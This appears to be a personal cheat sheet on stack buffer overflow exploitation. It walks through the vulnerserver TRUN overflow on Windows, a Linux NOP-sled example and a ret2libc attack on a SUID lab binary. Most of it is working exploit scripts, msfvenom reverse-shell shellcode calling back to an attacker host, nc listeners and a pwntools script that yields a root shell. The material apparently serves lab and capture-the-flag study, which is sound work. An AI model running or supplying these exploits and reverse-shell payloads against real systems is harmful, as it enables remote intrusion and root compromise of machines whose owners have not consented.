Buffer Overflow

Anatomy of Memory
	TOP
		Kernel
		Stack
			ESP = Extended Stack Pointer
			Buffer Space 
				grows down from ESP to EBP 
				should stop at EBP
			EBP = Extended Base Pointer
			EIP = Extended Instruction Pointer/Return Address
		Heap
		Data
		Text
	BOTTOM



GENERAL APPROACH (WINDOWS ATTACK MACHINE)
Spiking - find vulnerable part of app
	generic_send_tcp <target IP> <port> <spike_script> <SKIPVAR> <SKIPSTR>
	Example from vulnserver (commands: STATS, RTIME, TRUN, etc)
		generic_send_tcp 192.168.56.104 9999 stats.spk 0 0
		
		stats.spk contains:
			s_readline();
			s_string("STATS ");
			s_string_variable("0");
		
	repeat for each possibly vulnerable command 
		look for crash
		crash, ESP, and EIP values can be seen in debugger (.e.g Immunity)

Fuzzing - send characters to attempt to break app 
	Fuzzing TRUN command in vulnserv.exe
	bof.py contains:
		#!/usr/bin/python
		import sys, socket
		from time import sleep

		buffer = "A" * 100

		while True:
		  try:
		    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		    s.connect(("192.168.56.104", 9999))
		    s.send(("TRUN /.:/" + buffer))     
		    	# the /.:/ was added from Immunity debugger spike results
		    s.close()
		    sleep(1)
		    buffer = buffer + "A"*100

		  except:
		    print "Fuzzing crashed at %s bytes" % (str(len(buffer)))
		    sys.exit()

Find offset
	Take output of bof.py and round off to nearest kb.
	Run metaspoloit pattern_create:
	 	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <crash bytes rounded>
	Copy output into off.py:
		#!/usr/bin/python
			import sys, socket
		
			offset = "A" * 100

			try:
			    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			    s.connect(("192.168.56.104", 9999))
			    s.send(("TRUN /.:/" + offset))     
			    	# the /.:/ was added from Immunity debugger spike results
			    s.close()

			  except:
			    print "Error connecting to server"
			    sys.exit()		

	Get EIP value from debugger
	Run metaspoloit pattern_create:
	 	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <crash bytes rounded> -q <EIP finding>
	Get Offset

Overwrite EIP - point at shellcode
	Run overwrite.py using discovered offset:

		#!/usr/bin/python
			import sys, socket

			# offset is discovered using off.py and pattern_offset.rb
			offset = 2003

			# for testing EIP is <offset> bytes in and 4 bytes long
			shellcode = "A" * offset + "B" * 4

			try:
			    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			    s.connect(("192.168.56.104", 9999))
			    s.send(("TRUN /.:/" + shellcode))     
			           # the /.:/ was added from Immunity debugger spike results
			    s.close()

			except:
			    print ("Error connecting to server")
			    sys.exit()

	Debugger should show 41414141 (i.e. AAAA) in EBP and 42424242 (i.e. BBBB) in EIP - confirms we can control the EIP

Find bad characters
	manually test using badchars from:
	https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/

	null byte (\x00) is already likely bad, so can remove at start

	add badchars to badchar.py:

			#!/usr/bin/python
			import sys, socket

			# offset is discovered using off.py and pattern_offset.rb
			offset = 2003

			# testing for bad characters for shellcode
			badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
			"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
			"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
			"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
			"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
			"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
			"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
			"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

			# for testing EIP is <offset> bytes in and 4 bytes long
			shellcode = "A" * offset + "B" * 4 + badchars

			try:
			    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			    s.connect(("192.168.56.104", 9999))
			    s.send(("TRUN /.:/" + shellcode))     
			           # the /.:/ was added from Immunity debugger spike results
			    s.close()

			except:
			    print ("Error connecting to server")
			    sys.exit()

	In debugger, right-click ESP and select Follow in Dump
		Look for hex bytes between 00 and FF out of sequence 
			these are the bad characters - cannot be in our shellcode

Find right module
	Get mona.py from https://github.com/corelan/mona
	Add mona.py to Immunity Debugger PyCommands folder:
		C:\Program Files(x86)\Immunity Inc\Immunity Debugger\PyCommands\
	In Immunity's bottom text bar type: ! mona modules
		looking for modules with all or mostly FALSE for protections
		in this example essfunc.dll is all FALSE

	Need to convert JMP assembly command to hex using nasm_shell.rb:
		/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
		nasm > JMP ESP					#this is FFE4
		nasm > exit 					#exits nasm

	In Immunity's bottom text bar type: 
		! mona find -s "\xff\xe4" -m essfunc.dll 
		looking for return address (first column) in results 
			these are in big endian format

	Modify module.py using discovered return address(es):

		#!/usr/bin/python
		import sys, socket

		# offset is discovered using off.py and pattern_offset.rb
		offset = 2003

		# return address is discovered using mona in Immunity - here it must be little endian for x86 architecture
		returnaddress = "\xaf\x11\x50\x62"

		# for testing EIP is <offset> bytes in and 4 bytes long
		shellcode = "A" * offset + returnaddress 


		try:
		    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		    s.connect(("192.168.56.104", 9999))
		    s.send(("TRUN /.:/" + shellcode))     
		           # the /.:/ was added from Immunity debugger spike results
		    s.close()

		except:
		    print ("Error connecting to server")
		    sys.exit()

	In Immunity:
		minimize mona results window
		select Go To Address in Disassembler icon (blue arrow pointing at dotted line/stack)
			enter return address (big endian)
			Press F2 to set break point on this address

	Run module.py
		should crash and return EIP <return address> <vulnerable module>.<return address>
			e.g. EIP 625011AF essfunc.625011AF
		we control EIP!

Generate shellcode using msfvenom
	msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> EXITFUNC=thread -f c -a x86 -b "\x00<and any other bad characters"

	e.g. msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.125 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"

	Provide returned payload in exploit.py
		#!/usr/bin/python
		import sys, socket

		# offset is discovered using off.py and pattern_offset.rb
		offset = 2003

		# return address is discovered using mona in Immunity - here it must be little endian for x86 architecture
		returnaddress = "\xaf\x11\x50\x62"

		# overflow payload produced by msfvenom
		overflow = ("\xbf\x4c\x83\x38\xa0\xda\xc2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
		"\x52\x83\xc2\x04\x31\x7a\x0e\x03\x36\x8d\xda\x55\x3a\x79\x98"
		"\x96\xc2\x7a\xfd\x1f\x27\x4b\x3d\x7b\x2c\xfc\x8d\x0f\x60\xf1"
		"\x66\x5d\x90\x82\x0b\x4a\x97\x23\xa1\xac\x96\xb4\x9a\x8d\xb9"
		"\x36\xe1\xc1\x19\x06\x2a\x14\x58\x4f\x57\xd5\x08\x18\x13\x48"
		"\xbc\x2d\x69\x51\x37\x7d\x7f\xd1\xa4\x36\x7e\xf0\x7b\x4c\xd9"
		"\xd2\x7a\x81\x51\x5b\x64\xc6\x5c\x15\x1f\x3c\x2a\xa4\xc9\x0c"
		"\xd3\x0b\x34\xa1\x26\x55\x71\x06\xd9\x20\x8b\x74\x64\x33\x48"
		"\x06\xb2\xb6\x4a\xa0\x31\x60\xb6\x50\x95\xf7\x3d\x5e\x52\x73"
		"\x19\x43\x65\x50\x12\x7f\xee\x57\xf4\x09\xb4\x73\xd0\x52\x6e"
		"\x1d\x41\x3f\xc1\x22\x91\xe0\xbe\x86\xda\x0d\xaa\xba\x81\x59"
		"\x1f\xf7\x39\x9a\x37\x80\x4a\xa8\x98\x3a\xc4\x80\x51\xe5\x13"
		"\xe6\x4b\x51\x8b\x19\x74\xa2\x82\xdd\x20\xf2\xbc\xf4\x48\x99"
		"\x3c\xf8\x9c\x0e\x6c\x56\x4f\xef\xdc\x16\x3f\x87\x36\x99\x60"
		"\xb7\x39\x73\x09\x52\xc0\x14\xf6\x0b\xf2\x99\x9e\x49\x02\x73"
		"\x03\xc7\xe4\x19\xab\x81\xbf\xb5\x52\x88\x4b\x27\x9a\x06\x36"
		"\x67\x10\xa5\xc7\x26\xd1\xc0\xdb\xdf\x11\x9f\x81\x76\x2d\x35"
		"\xad\x15\xbc\xd2\x2d\x53\xdd\x4c\x7a\x34\x13\x85\xee\xa8\x0a"
		"\x3f\x0c\x31\xca\x78\x94\xee\x2f\x86\x15\x62\x0b\xac\x05\xba"
		"\x94\xe8\x71\x12\xc3\xa6\x2f\xd4\xbd\x08\x99\x8e\x12\xc3\x4d"
		"\x56\x59\xd4\x0b\x57\xb4\xa2\xf3\xe6\x61\xf3\x0c\xc6\xe5\xf3"
		"\x75\x3a\x96\xfc\xac\xfe\xb6\x1e\x64\x0b\x5f\x87\xed\xb6\x02"
		"\x38\xd8\xf5\x3a\xbb\xe8\x85\xb8\xa3\x99\x80\x85\x63\x72\xf9"
		"\x96\x01\x74\xae\x97\x03")

		# the buffer is filled with A to the offset, the return address is provided for the
		# vulnerable module, 32 NOPS are provided to pad overflow, then the reverse shell
		# payload is provided. Experiment with the number of NOPS required to make exploit stable
		shellcode = "A" * offset + returnaddress + "\x90" *32 + overflow 


		try:
		    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		    s.connect(("192.168.56.104", 9999))
		    s.send(("TRUN /.:/" + shellcode))     
		           # the /.:/ was added from Immunity debugger spike results
		    s.close()

		except:
		    print ("Error connecting to server")
		    sys.exit()

	Run nc listener on port 4444 on attacker machine
	Run exploit.py



SIMPLE NOP-SLED EXAMPLE (LINUX, GDB ON VICTIM)
	/usr/local/bin/chal
	Segmentation fault (core dumped)

	chal 1
	no response

	chal A
	no response

	chal with 362 x A 
	seg fault
	This manual check could have been very cumbersome had the buffer been very large - instead we can run a script to find it to the nearest hundred

	#!/usr/bin/python
	##bof.py to find buffer estimate	
	import sys
	from time import sleep
	import os

	buffer = "A" * 100

	while True:
	 try:
	   os.system("/usr/local/bin/chal " + buffer)    
	   sleep(1)
	   buffer = buffer + "A"*10

	 except:
	   print "Fuzzing crashed at %s bytes" % (str(len(buffer)))
	   sys.exit()

	copy bof.py to target
	scp -i ~/results/10.10.10.20/loot/key bof.py thrasivoulos@[dead:beef:0000:0000:0250:56ff:feb9:f52c]:/tmp/

	python bof.py 
	Segmentation fault (core dumped)
	^CFuzzing crashed at 400 bytes

	typically, we would round to nearest kb, but we can round here to 400 safely

	create a test pattern to identify the EIP (Extended Instruction Pointer/Return Address) where the program actually crashes 

	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400

	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A

	need a debugger next 
	which gdb
	/usr/bin/gdb
	this machine has gdb (GNU Debugger)

	run the program in the debugger
	gdb /usr/local/bin/chal

	run <pattern> in the debugger
	run Aa0Aa1...An2A

	Program received signal SIGSEGV, Segmentation fault.
	0x316d4130 in ?? ()

	This is our kernel's EIP value - it is the hex for the characters 1mA0

	Find the offset for that EIP
	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 400 -q 0x316d4130
	[*] Exact match at offset 362
	Can we overwrite the EIP and have it point to our shellcode?

	run $(python -c 'print(("A"*362)+("B"*10))')

	Starting program: /usr/local/bin/chal $(python -c 'print(("A"*362)+("B"*4))')

	Program received signal SIGSEGV, Segmentation fault.
	0x42424242 in ?? ()

	need to look at the Extended Stack Pointer (ESP)
	Buffer Space grows from ESP to EBP (Extended Base Pointer)
	should stop at EBP
	(gdb) x/x $esp
	0xbffff570:     0x00000000
	(gdb) x/x $esp-1
	0xbffff56f:     0x00000042
	(gdb) x/x $esp-2
	0xbffff56e:     0x00004242
	(gdb) x/x $esp-3
	0xbffff56d:     0x00424242
	(gdb) x/x $esp-4
	0xbffff56c:     0x42424242

	can see that we have overwritten the EIP with our x42 ("B")

	We can overwrite EIP and it is at 0xbffff56c

	Are there any bad characters in our shellcode here?

	run $(python /tmp/badchars.py)

	#!/usr/bin/python
	##badchars.py to test for bad shellcode characters
	offset = 362

	# testing for bad characters for shellcode - test and retest by removing one line at a time from the string to see if the program will run and seg fault - test and retest by restoring half a line, quarter of a line, etc. until bad characters are identified and removed

	badchars = ""
	badchars += "\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0e\x0f"
	badchars += "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e"
	badchars += "\x1f\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d"
	badchars += "\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c"
	badchars += "\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b"
	badchars += "\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
	badchars += "\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69"
	badchars += "\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78"
	badchars += "\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87"
	badchars += "\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96"
	badchars += "\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5"
	badchars += "\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4"
	badchars += "\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
	badchars += "\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2"
	badchars += "\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1"
	badchars += "\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
	badchars += "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"


	# supplies all usable characters prepended by As to fill buffer
	shellcode = "A"*20 + badchars + "B"*360 

	print(shellcode)

	Generate a payload that will create a reverse shell

	do we have netcat?
	which netcat
	/bin/netcat

	msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.7 LPORT=9999 -f c -b "\x00\x09\x0a\x0d\x20" -a x86              

	#!/usr/bin/python
	offset = 362

	eip = "CCCC"

	exploit = "\xbe\x93\xac\xae\xe2\xda\xcd\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
	exploit += "\x12\x83\xc5\x04\x31\x75\x0e\x03\xe6\xa2\x4c\x17\x39\x60\x67"
	exploit += "\x3b\x6a\xd5\xdb\xd6\x8e\x50\x3a\x96\xe8\xaf\x3d\x44\xad\x9f"
	exploit += "\x01\xa6\xcd\xa9\x04\xc1\xa5\x23\xfd\x3f\x32\x5c\x03\x40\x1b"
	exploit += "\x93\x8a\xa1\xd3\xcd\xdc\x70\x40\xa1\xde\xfb\x87\x08\x60\xa9"
	exploit += "\x2f\xfd\x4e\x3d\xc7\x69\xbe\xee\x75\x03\x49\x13\x2b\x80\xc0"
	exploit += "\x35\x7b\x2d\x1e\x35"

	payload = "\x90"*(offset-len(exploit)) + exploit + eip

	print(payload)


	x/200x $esp-100

	look for the 90909090 of the "nop sled"
	pick an address in the nop sled
	0xbffff7f0

	replace the CCCC in EIP with the little endian version of the chosen address
	eip = "\xf0\xf7\xff\xbf"


	The nops (\x90 = nop = no operation = go to next command) and shellcode get written into the buffer space and the EIP gets overwritten with an address in the nop sled. When the program finishes writing and reads the EIP as its return address, it will go to bffff740 in the nop sled, proceed along the nop sled until it reaches the shell code, then execute it.

	chal $(python /tmp/exploit.py)



RET2LIBC EXAMPLE (LINUX, GDB ON VICTIM, GDB-PEDA ON ATTACKER)

	we get the LCARS Bridge Secondary Controls Menu. And we can explore each of the options. For the most part they don't do much of anything except accept some input (even quite large input), terminate normally, and return us to the menu. 

	1. Navigation
	2. Ships Log
	3. Science
	4. Security
	5. StellaCartography
	6. Engineering
	7. Exit

	But, option 4 - security - is not quite so robust, and a large user input there gets us a segmentation fault.

	Waiting for input: 
	4
	Disable Security Force Fields
	Enter Security Override:
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	Segmentation Fault

	So, let's upgrade our local GDB debugger while we're here by adding the Python Exploit Development Assist for GDB - https://github.com/longld/peda

	cd /opt
	git clone https://github.com/longld/peda.git ~/peda
	echo "source ~/peda/peda.py" >> ~/.gdbinit

	and run the binary in our upgraded GDB
	gdb ./lcars

	Our first order of business is going to be to create a test pattern to identify the EIP (Extended Instruction Pointer/Return Address) where the program actually crashes. This is actually built in as part of our PEDA upgrade

	pattern_create 350

	AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA

	Then we run our program and supply this as user input for our overflow.

	run
	enter
	picarda1
	4
	<pattern>

	and we get a seg fault at address 0x25412425

	Now, we can simply feed that into the pattern offset function built into our PEDA upgrade
	pattern_offset 0x25412425
	625026085 found at offset: 212

	And it finds our offset at 212 characters
	So, can we overwrite the EIP and have it point where we want?

	python -c 'print(("A"*212)+("B"*4))'

	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

	Stopped reason: SIGSEGV
	0x42424242 in ?? ()

	Well, that seg fault with all 42s (our 4 Bs) says we certainly can

	Now, something we glossed over on the first buffer overflow is the question of whether or not the EIP will be in a consistent place when we run it on Enterprise. That is, is ASLR employed?

	ALSR, or Address Space Layout Randomization, randomly sets the base memory address of an executable and the position of libraries, heap, and stack, in a process's address space, which would mean that the memory location we want to point to would change every time we ran the program, and prevent us from hitting our target.

	So, let's hop back into our shell on enterprise to check

	nc -nvlp 9999
	https://10.10.10.61/files
	We'll upgrade our shell while we're here

	python3 -c 'import pty; pty.spawn("/bin/bash")'

	Ctrl-Z
	stty raw -echo
	fg

	And we can check on ALSR by looking at the randomize_va_space value 
	cat /proc/sys/kernel/randomize_va_space
	0  

	so, ASLR is turned off

	The next question, which we also glossed over last time, is the status of the Data Execution on this machine. In addition to ASLR, another response to the sorts of buffer overflow we conducted last time, where we wrote our shellcode into the buffer of a variable and then pointed our EIP to the nop sled somewhere just before that shellcode...to prevent that from happening, Data Execution Prevention prevents memory regions that hold user data from also being memory regions where code is executed. This is implemented in hardware, and enabled with the use of the NX (no-execute) bit. If the NX bit is set, then we could put all the shellcode we want into a user input variable's memory buffer, but we could never execute that code.

	We can check if that's set by reading the system's /proc/cpuinfo file, which will contain the nx and/or pae flag, if Data Execution Protection is not disbled in BIOS on the machine. Most 64-bit CPUs are capable of no-execute protections using the nx flag, and many 32-bit systems are capable of similar protections using the pae (Physical Address Extension) flag, although with some bruteforce vulnerability because it has only 16-bits available for doing address randomisation. In any case, we can grep for the flags line in the cpuinfo file to see if nx or pae are there:

	grep ^flags /proc/cpuinfo

	So, the nx flag is present, which means we can't just provide our own shellcode to buffer and execute it by pointing our EIP to it. But we can make use of code that is already in the executable memory spaces of the lcars process and point to that. 

	So, we need to collect a bit of information to see what's available to us to exploit and where. So, if we hop back into our shell on Enterprise and run the lcars binary in gdb there...

	cd /bin
	/usr/bin/gdb lcars

	provide our access code
	picarda1

	select #4 security

	4

	and trigger a seg fault
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

	then we can gather information about the process

	info proc map

	and that shows use the program is accessing the shared C standard library,  libc, which provides us with plenty to work from, like the system() function that allows us to run an arbitrary system command. And we can find that function's memory address using the print command

	print system
	0xf7e4c060

	We'll also look for the exit() function, just to be good guests and not leave zombie processes running on the system after we get our shell.

	print exit
	0xf7e3faf0

	This is the address the binary will return to after running the system() function - for an attacker, this could really be anything, but we'll give it a clean exit after we run our shell command.

	And the next thing we need in a place in memory that contains the string "sh", which will be the argument for our system() function - that is, system will try to run an sh shell and then exit.

	From our info proc map output, we can see where the libc library lives in memory, and we can provide its start address as the start address in our find command

	find <start_address for libc>, +999999,"sh"

	and just tell it to look from that start address to anywhere in the next 999999 addresses for the string "sh"

	0xf7f70a0f

	This command can return multiple results, and we can double-check those using the x/s command. That's x for examine, and /s to format the output as a string

	x/s 0xf7f70a0f
	0xf7f6ddd5:     "sh"

	So, these are are the memory positions of the libc commands system and exit, and of the string "/bin/sh". If we put those together, we get the program to call the system() function which allows us to run a system command, such as running our string argument "/bin/sh" to get a shell, and we provide the address of the exit() function as the next step our program will take after it runs our system command. 

	And remember...this program is owned by root and has the SUID bit set, so it will open that shell as root.

	So, now we're ready to build out exploit code:

	#!/usr/bin/env python3

	from pwn import *

	host = "10.10.10.61"
	port = 32812
	bridge_code = "picarda1"
	option = "4"

	offset = "A" * 212

	system = p32(0xf7e4c060) #system function address in little endian 
	# p32() saves us converting manually to \x60\xc0\xe4\xf7 
	exit = p32(0xf7e3faf0) #exit function address in little endian
	shell = p32(0xf7f6ddd5) #/bin/sh string address in little endian

	payload = bytes(offset,'utf-8') + system + exit + shell
	need to convert our offset to a byte string so that it can concatenate with the function address byte strings

	s = remote(host,port)

	#print(s.recvuntil(":"))
	s.recvuntil(":")
	s.sendline(bridge_code)
	s.recvuntil(":")
	s.sendline(option)
	s.recvuntil(":")
	s.sendline(payload)
	s.interactive()

	Now, we can run our exploit.py code 
	python3 exploit.py

	and we get a shell in the LCARS interface on port 32812

